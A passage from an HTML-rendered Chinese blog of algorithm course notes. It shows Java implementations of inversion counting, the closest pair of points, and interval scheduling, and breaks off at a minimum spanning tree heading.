java.util.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Countlnversions</span> {<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><br>    {<br>        System.out.println(<span class="hljs-string">"请输入待计数逆序的整数序列(以空格分开，各项值都不同)"</span>);<br>        Scanner in=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>        String line=in.nextLine();<br>        String[] tokens=line.split(<span class="hljs-string">" "</span>);<br>        <span class="hljs-comment">//获取用户输入的序列</span><br>        <span class="hljs-type">int</span>[] S1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[tokens.length];<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;tokens.length;i++)<br>            S1[i]=Integer.parseInt(tokens[i]);<br>        <span class="hljs-type">int</span> count=sortAndCount(S1);<br>        <span class="hljs-comment">//调用实现SAC算法的方法，返回计数结果</span><br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;S1.length;i++)<br>            System.out.print(S1[i]+<span class="hljs-string">" "</span>);<br>        System.out.print(<span class="hljs-string">"\n逆序计数为："</span>+count);<br>        <span class="hljs-comment">//显示排序后的序列和逆序计数值</span><br>    }<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sortAndCount</span><span class="hljs-params">(<span class="hljs-type">int</span>[]S)</span>{<br>        <span class="hljs-keyword">if</span>(S.length==<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> n=S.length/<span class="hljs-number">2</span>;<br>        <span class="hljs-type">int</span>[] A=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[n];<br>        <span class="hljs-type">int</span>[] B=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[S.length-n];<br>        <span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;A.length;i++)<br>            A[i]=S[j++];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;B.length;i++)<br>            B[i]=S[j++];<br>        <span class="hljs-type">int</span> rA=sortAndCount(A);<br>        <span class="hljs-type">int</span> rB=sortAndCount(B);<br>        <span class="hljs-type">int</span> r=mergeAndCount(A,B,S);<br>        <span class="hljs-keyword">return</span> (r+rA+rB);<br>    }<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">mergeAndCount</span><span class="hljs-params">(<span class="hljs-type">int</span>[]A,<span class="hljs-type">int</span>[]B,<span class="hljs-type">int</span>[]C)</span><br>    {<br>        <span class="hljs-type">int</span> i=<span class="hljs-number">0</span>,j=<span class="hljs-number">0</span>,k=<span class="hljs-number">0</span>,count=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> (i&lt;A.length&amp;&amp;j&lt;B.length)<br>        {<br>            <span class="hljs-keyword">if</span> (A[i]&gt;B[j])<br>            {<br>                count+=A.length-i;<br>                C[k++]=B[j++];<br>            }<br>            <span class="hljs-keyword">else</span> {<br>                C[k++]=A[i++];<br>            }<br>        }<br>        <span class="hljs-keyword">if</span> (i==A.length&amp;&amp;j&lt; B.length)<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> l=j;l&lt; B.length;l++)<br>                C[k++]=B[l];<br>        <span class="hljs-keyword">if</span> (i&lt; A.length&amp;&amp;j== B.length)<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> l=i;l&lt; A.length;l++)<br>                C[k++]=A[l];<br>        <span class="hljs-keyword">return</span> count;<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><h3 id="寻找最近点对"><a href="#寻找最近点对" class="headerlink" title="寻找最近点对"></a>寻找最近点对</h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Arrays;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FindClosestPair</span> {<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {<br>        <span class="hljs-type">int</span> N=<span class="hljs-number">30</span>;<br>        <span class="hljs-type">int</span> beishu=<span class="hljs-number">5000</span>;<br>        <span class="hljs-type">int</span>[] x=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[N];<br>        <span class="hljs-type">int</span>[] y=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[N];<br>        <span class="hljs-type">int</span>[] p2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">4</span>];<br>        <span class="hljs-type">int</span>[] x2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[N];<br>        <span class="hljs-type">int</span>[] y2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[N];<br>        StdDraw.setXscale(<span class="hljs-number">0</span>, beishu);<br>        StdDraw.setYscale(<span class="hljs-number">0</span>, beishu);<br>        StdDraw.setPenRadius(<span class="hljs-number">0.005</span>);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;N;i++){<br>            x[i]=(<span class="hljs-type">int</span>)(Math.random()*beishu);<br>            y[i]=(<span class="hljs-type">int</span>)(Math.random()*beishu);<br>            x2[i]=x[i];<br>            y2[i]=y[i];<br>        }<br>        <span class="hljs-type">int</span>[][] pX=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">2</span>][N];<br>        <span class="hljs-type">int</span>[][] pY=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">2</span>][N];<br>        <span class="hljs-type">int</span>[] flagX=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[N];<br>        <span class="hljs-type">int</span>[] flagY=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[N];<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;N;i++){<br>            StdDraw.point(x[i], y[i]);<br>            flagX[i]=<span class="hljs-number">1</span>;<br>            flagY[i]=<span class="hljs-number">1</span>;<br>        }<br>        Arrays.sort(x);<br>        Arrays.sort(y);<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;N;i++){<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;N;j++){<br>                <span class="hljs-keyword">if</span>(x[i]==x2[j]&amp;&amp;flagX[j]==<span class="hljs-number">1</span>){<br>                    pX[<span class="hljs-number">0</span>][i]=x2[j];<br>                    pX[<span class="hljs-number">1</span>][i]=y2[j];<br>                    flagX[j]=<span class="hljs-number">0</span>;<br>                }<br>                <span class="hljs-keyword">if</span> (y[i]==y2[j]&amp;&amp;flagY[j]==<span class="hljs-number">1</span>){<br>                    pY[<span class="hljs-number">0</span>][i]=x2[j];<br>                    pY[<span class="hljs-number">1</span>][i]=y2[j];<br>                    flagY[j]=<span class="hljs-number">0</span>;<br>                }<br>            }<br>        }<br>        ClosestPairRec(pX,pY,p2);<br>        System.out.println(p2[<span class="hljs-number">0</span>]+<span class="hljs-string">" "</span>+p2[<span class="hljs-number">1</span>]+<span class="hljs-string">" "</span>+p2[<span class="hljs-number">2</span>]+<span class="hljs-string">" "</span>+p2[<span class="hljs-number">3</span>]);<br>        StdDraw.setPenColor(StdDraw.RED);<br>        StdDraw.line(p2[<span class="hljs-number">0</span>], p2[<span class="hljs-number">1</span>], p2[<span class="hljs-number">2</span>], p2[<span class="hljs-number">3</span>]);<br><br><br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">ClosestPairRec</span><span class="hljs-params">(<span class="hljs-type">int</span>[][] pX, <span class="hljs-type">int</span>[][] pY, <span class="hljs-type">int</span>[] p2)</span> {<br>        <span class="hljs-keyword">if</span>(pX[<span class="hljs-number">0</span>].length&lt;=<span class="hljs-number">3</span>){<br>            <span class="hljs-keyword">if</span> (pX[<span class="hljs-number">0</span>].length==<span class="hljs-number">3</span>){<br>                <span class="hljs-type">int</span> d1=(pX[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]-pX[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>])* (pX[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]-pX[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>])+(pX[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]-pX[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>])* (pX[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]-pX[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>]);<br>                <span class="hljs-type">int</span> d2=(pX[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>]-pX[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>])* (pX[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>]-pX[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>])+(pX[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>]-pX[<span class="hljs-number">1</span>][<span class="hljs-number">2</span>])* (pX[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>]-pX[<span class="hljs-number">1</span>][<span class="hljs-number">2</span>]);<br>                <span class="hljs-type">int</span> d3=(pX[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]-pX[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>])* (pX[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]-pX[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>])+(pX[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]-pX[<span class="hljs-number">1</span>][<span class="hljs-number">2</span>])* (pX[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]-pX[<span class="hljs-number">1</span>][<span class="hljs-number">2</span>]);<br>                <span class="hljs-keyword">if</span>(d1&gt;=d2&amp;&amp;d1&gt;=d3){<br>                    p2[<span class="hljs-number">0</span>]=pX[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>];<br>                    p2[<span class="hljs-number">1</span>]=pX[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>];<br>                    p2[<span class="hljs-number">2</span>]=pX[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>];<br>                    p2[<span class="hljs-number">3</span>]=pX[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>];<br>                }<br>                <span class="hljs-keyword">if</span>(d2&gt;=d1&amp;&amp;d2&gt;=d3){<br>                    p2[<span class="hljs-number">0</span>]=pX[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>];<br>                    p2[<span class="hljs-number">1</span>]=pX[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>];<br>                    p2[<span class="hljs-number">2</span>]=pX[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>];<br>                    p2[<span class="hljs-number">3</span>]=pX[<span class="hljs-number">1</span>][<span class="hljs-number">2</span>];<br>                }<br>                <span class="hljs-keyword">if</span>(d3&gt;=d1&amp;&amp;d3&gt;=d2){<br>                    p2[<span class="hljs-number">0</span>]=pX[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>];<br>                    p2[<span class="hljs-number">1</span>]=pX[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>];<br>                    p2[<span class="hljs-number">2</span>]=pX[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>];<br>                    p2[<span class="hljs-number">3</span>]=pX[<span class="hljs-number">1</span>][<span class="hljs-number">2</span>];<br>                }<br>            }<br>            <span class="hljs-keyword">if</span>(pX[<span class="hljs-number">0</span>].length==<span class="hljs-number">2</span>){<br>                p2[<span class="hljs-number">0</span>]=pX[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>];<br>                p2[<span class="hljs-number">1</span>]=pX[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>];<br>                p2[<span class="hljs-number">2</span>]=pX[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>];<br>                p2[<span class="hljs-number">3</span>]=pX[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>];<br>            }<br>            <span class="hljs-keyword">return</span>;<br>        }<br>        <span class="hljs-type">int</span> <span class="hljs-variable">foreHalf</span> <span class="hljs-operator">=</span> pX[<span class="hljs-number">0</span>].length/<span class="hljs-number">2</span>;<br>        <span class="hljs-type">int</span>[][] qX=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">2</span>][foreHalf];<br>        <span class="hljs-type">int</span>[][] qY=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">2</span>][foreHalf];<br>        <span class="hljs-type">int</span>[][] rX=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">2</span>][pX[<span class="hljs-number">0</span>].length-foreHalf];<br>        <span class="hljs-type">int</span>[][] rY=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">2</span>][pX[<span class="hljs-number">0</span>].length-foreHalf];<br>        <span class="hljs-type">int</span>[] qp2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">4</span>];<br>        <span class="hljs-type">int</span>[] rp2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">4</span>];<br>        <span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;pX[<span class="hljs-number">0</span>].length;i++){<br>            <span class="hljs-keyword">if</span>(i&lt;foreHalf) {<br>                qX[<span class="hljs-number">0</span>][i] = pX[<span class="hljs-number">0</span>][i];<br>                qX[<span class="hljs-number">1</span>][i] = pX[<span class="hljs-number">1</span>][i];<br>                qY[<span class="hljs-number">0</span>][i] = pY[<span class="hljs-number">0</span>][i];<br>                qY[<span class="hljs-number">1</span>][i] = pY[<span class="hljs-number">1</span>][i];<br>            }<br>            <span class="hljs-keyword">else</span>{<br>                rX[<span class="hljs-number">0</span>][k] = pX[<span class="hljs-number">0</span>][i];<br>                rX[<span class="hljs-number">1</span>][k] = pX[<span class="hljs-number">1</span>][i];<br>                rY[<span class="hljs-number">0</span>][k] = pY[<span class="hljs-number">0</span>][i];<br>                rY[<span class="hljs-number">1</span>][k] = pY[<span class="hljs-number">1</span>][i];<br>                k=k+<span class="hljs-number">1</span>;<br>            }<br>        }<br><br>        ClosestPairRec(qX,qY,qp2);<br>        ClosestPairRec(rX,rY,rp2);<br>        <span class="hljs-type">int</span> dd1=(qp2[<span class="hljs-number">2</span>]-qp2[<span class="hljs-number">0</span>])* (qp2[<span class="hljs-number">2</span>]-qp2[<span class="hljs-number">0</span>])+(qp2[<span class="hljs-number">1</span>]-qp2[<span class="hljs-number">3</span>])* (qp2[<span class="hljs-number">1</span>]-qp2[<span class="hljs-number">3</span>]);<br>        <span class="hljs-type">int</span> dd2=(rp2[<span class="hljs-number">2</span>]-rp2[<span class="hljs-number">0</span>])* (rp2[<span class="hljs-number">2</span>]-rp2[<span class="hljs-number">0</span>])+(rp2[<span class="hljs-number">1</span>]-rp2[<span class="hljs-number">3</span>])* (rp2[<span class="hljs-number">1</span>]-rp2[<span class="hljs-number">3</span>]);<br>        <span class="hljs-type">int</span> d2=Math.min(dd2,dd1);<br>        <span class="hljs-type">double</span> d=Math.sqrt(d2);<br>        <span class="hljs-keyword">if</span> (dd1&lt;dd2){<br>            p2[<span class="hljs-number">0</span>]=qp2[<span class="hljs-number">0</span>];<br>            p2[<span class="hljs-number">1</span>]=qp2[<span class="hljs-number">1</span>];<br>            p2[<span class="hljs-number">2</span>]=qp2[<span class="hljs-number">2</span>];<br>            p2[<span class="hljs-number">3</span>]=qp2[<span class="hljs-number">3</span>];<br>        }<br>        <span class="hljs-keyword">else</span>{<br>            p2[<span class="hljs-number">0</span>]=rp2[<span class="hljs-number">0</span>];<br>            p2[<span class="hljs-number">1</span>]=rp2[<span class="hljs-number">1</span>];<br>            p2[<span class="hljs-number">2</span>]=rp2[<span class="hljs-number">2</span>];<br>            p2[<span class="hljs-number">3</span>]=rp2[<span class="hljs-number">3</span>];<br>        }<br>        <span class="hljs-type">int</span>[][] sY=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">2</span>][pX[<span class="hljs-number">0</span>].length];<br>        <span class="hljs-type">int</span> count=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;pX[<span class="hljs-number">0</span>].length;i++){<br>            <span class="hljs-keyword">if</span>(pY[<span class="hljs-number">0</span>][i]&gt;(pX[<span class="hljs-number">0</span>][foreHalf-<span class="hljs-number">1</span>]-d)&amp;&amp;pY[<span class="hljs-number">0</span>][i]&lt;(pX[<span class="hljs-number">0</span>][foreHalf-<span class="hljs-number">1</span>]+d)){<br>                sY[<span class="hljs-number">0</span>][count]=pY[<span class="hljs-number">0</span>][i];<br>                sY[<span class="hljs-number">1</span>][count]=pY[<span class="hljs-number">1</span>][i];<br>                count=count+<span class="hljs-number">1</span>;<br>            }<br>        }<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;count;i++){<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=<span class="hljs-number">15</span>&amp;&amp;(j+<span class="hljs-number">1</span>)&lt;count;j++){<br>                <span class="hljs-type">int</span> dl=(sY[<span class="hljs-number">0</span>][i]-sY[<span class="hljs-number">0</span>][i+j])* (sY[<span class="hljs-number">0</span>][i]-sY[<span class="hljs-number">0</span>][i+j])+(sY[<span class="hljs-number">1</span>][i]-sY[<span class="hljs-number">1</span>][i+j])* (sY[<span class="hljs-number">1</span>][i]-sY[<span class="hljs-number">1</span>][i+j]);<br>                <span class="hljs-keyword">if</span>(dl&lt;d2){<br>                    d2=dl;<br>                    p2[<span class="hljs-number">0</span>]=sY[<span class="hljs-number">0</span>][i];<br>                    p2[<span class="hljs-number">1</span>]=sY[<span class="hljs-number">1</span>][i];<br>                    p2[<span class="hljs-number">2</span>]=sY[<span class="hljs-number">0</span>][i+j];<br>                    p2[<span class="hljs-number">3</span>]=sY[<span class="hljs-number">1</span>][i+j];<br>                }<br>            }<br>        }<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><h2 id="第三章"><a href="#第三章" class="headerlink" title="第三章"></a>第三章</h2><h3 id="时序分配"><a href="#时序分配" class="headerlink" title="时序分配"></a>时序分配</h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Source code recreated from a .class file by IntelliJ IDEA</span><br><span class="hljs-comment">// (powered by FernFlower decompiler)</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IntervarSchedulingDemo</span> {<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">IntervarSchedulingDemo</span><span class="hljs-params">()</span> {<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {<br>        <span class="hljs-type">int</span> <span class="hljs-variable">isN</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">gis</span> <span class="hljs-operator">=</span> <span class="hljs-number">50</span>;<br>        <span class="hljs-type">int</span>[] isF = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span>[] isS = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span>[] isY = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span>[] isF2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span>[] isS2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span>[] isY2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span>[] isR = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span> <span class="hljs-variable">beishu</span> <span class="hljs-operator">=</span> gis;<br>        <span class="hljs-type">int</span>[] flagX = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-type">int</span> i;<br>        <span class="hljs-type">int</span> j;<br>        <span class="hljs-keyword">while</span>(c &lt; isN) {<br>            i = (<span class="hljs-type">int</span>)(Math.random() * (<span class="hljs-type">double</span>)beishu);<br>            j = (<span class="hljs-type">int</span>)(Math.random() * (<span class="hljs-type">double</span>)beishu);<br>            <span class="hljs-type">int</span> <span class="hljs-variable">d3</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>)(Math.random() * (<span class="hljs-type">double</span>)beishu);<br>            <span class="hljs-keyword">if</span> (i &gt; j) {<br>                isS[c] = j;<br>                isF[c] = i;<br>                isF2[c] = i;<br>                isY[c] = d3;<br>                isR[c] = <span class="hljs-number">1</span>;<br>                flagX[c] = <span class="hljs-number">1</span>;<br>                ++c;<br>            }<br>        }<br><br>        StdDraw.setXscale(<span class="hljs-number">0.0</span>, (<span class="hljs-type">double</span>)beishu);<br>        StdDraw.setYscale(<span class="hljs-number">0.0</span>, (<span class="hljs-type">double</span>)beishu);<br>        StdDraw.setPenRadius(<span class="hljs-number">0.005</span>);<br>        Arrays.sort(isF);<br><br>        <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; isN; ++i) {<br>            <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt; isN; ++j) {<br>                <span class="hljs-keyword">if</span> (isF[i] == isF2[j] &amp;&amp; flagX[j] == <span class="hljs-number">1</span>) {<br>                    isS2[i] = isS[j];<br>                    isY2[i] = isY[j];<br>                    flagX[j] = <span class="hljs-number">0</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                }<br>            }<br>        }<br><br>        <span class="hljs-keyword">for</span>(c = <span class="hljs-number">0</span>; c &lt; isN; ++c) {<br>            <span class="hljs-keyword">if</span> (isR[c] == <span class="hljs-number">1</span>) {<br>                <span class="hljs-keyword">for</span>(i = c + <span class="hljs-number">1</span>; i &lt; isN; ++i) {<br>                    <span class="hljs-keyword">if</span> (isS2[i] &lt; isF[c]) {<br>                        isR[i] = <span class="hljs-number">0</span>;<br>                    }<br>                }<br>            }<br>        }<br><br>        <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; isN; ++i) {<br>            <span class="hljs-keyword">if</span> (isR[i] == <span class="hljs-number">1</span>) {<br>                StdDraw.setPenColor(StdDraw.RED);<br>                StdDraw.line((<span class="hljs-type">double</span>)isS2[i], (<span class="hljs-type">double</span>)isY2[i], (<span class="hljs-type">double</span>)isF[i], (<span class="hljs-type">double</span>)isY2[i]);<br>            } <span class="hljs-keyword">else</span> {<br>                StdDraw.setPenColor(StdDraw.BLACK);<br>                StdDraw.line((<span class="hljs-type">double</span>)isS2[i], (<span class="hljs-type">double</span>)isY2[i], (<span class="hljs-type">double</span>)isF[i], (<span class="hljs-type">double</span>)isY2[i]);<br>            }<br>        }<br><br>    }<br>}<br><br></code></pre></td></tr></tbody></table></figure><h3 id="最小生成树"><a href="#最小生成树" class="headerlink" title="最小生成树"></a>最小生成树</h3><h4 id="kru"><a href="#kru" class="headerlink" title="kru"></a>kru</h4><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 